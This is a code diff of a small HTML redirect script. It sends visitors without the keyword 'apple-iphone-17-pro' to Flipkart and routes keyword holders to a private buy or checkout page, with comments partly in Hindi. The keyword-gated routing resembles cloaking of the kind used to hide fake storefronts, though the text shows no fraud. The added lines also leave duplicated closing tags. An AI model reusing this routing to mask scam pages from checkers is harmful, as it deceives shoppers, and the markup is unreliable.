@@ -8,33 +8,39 @@
         var VERIFY_KEYWORD = 'apple-iphone-17-pro';
         var href = window.location.href.toLowerCase();
 
-        var hasKeyword = href.indexOf(VERIFY_KEYWORD) !== -1;
-        var hasBuy = href.indexOf('buy.html') !== -1;
-
-        // 1. If keyword is NOT present -> Go to Flipkart (even if buy.html is present)
-        if (!hasKeyword) {
+        // 1. Keyword check: अगर keyword नहीं है तो तुरंत Flipkart पर भेजें
+        if (href.indexOf(VERIFY_KEYWORD) === -1) {
           window.location.replace('https://www.flipkart.com');
           return;
         }
 
-        // Base repository path
         var repo = '/kk';
-        var path = window.location.pathname.substring(repo.length);
-        var search = window.location.search;
-        var hash = window.location.hash;
-        var fullTarget = encodeURIComponent(path + search + hash);
+        var isBuy = href.indexOf('buy.html') !== -1;
 
-        // 2. Keyword present AND "buy.html" is in link -> Send to buy.html
-        if (hasBuy) {
-          window.location.replace(repo + '/buy.html?p=' + fullTarget);
-        } 
-        // 3. Keyword present but NO "buy.html" -> Send to index.html
-        else {
-          window.location.replace(repo + '/?p=' + fullTarget);
+        // 2. Buy Page: URL को बिल्कुल साफ और छोटा (35 chars) रखें (No loop / No repeating)
+        if (isBuy) {
+          window.location.replace(repo + '/buy.html?p=' + VERIFY_KEYWORD);
+          return;
         }
+
+        // 3. Product Page: सिर्फ साफ path लें, पुराना search query हटा दें ताकि लिंक कभी बड़ा न हो
+        var pathname = window.location.pathname;
+        if (pathname.indexOf(repo) === 0) {
+          pathname = pathname.substring(repo.length);
+        }
+        
+        if (!pathname || pathname === '/' || pathname === '/index.html') {
+          pathname = '/checkout/' + VERIFY_KEYWORD;
+        }
+
+        // Clean single redirect
+        window.location.replace(repo + '/?p=' + encodeURIComponent(pathname));
       })();
     </script>
 </head>
+<body>
+</body>
+</html></head>
 <body>
 </body>
 </html>
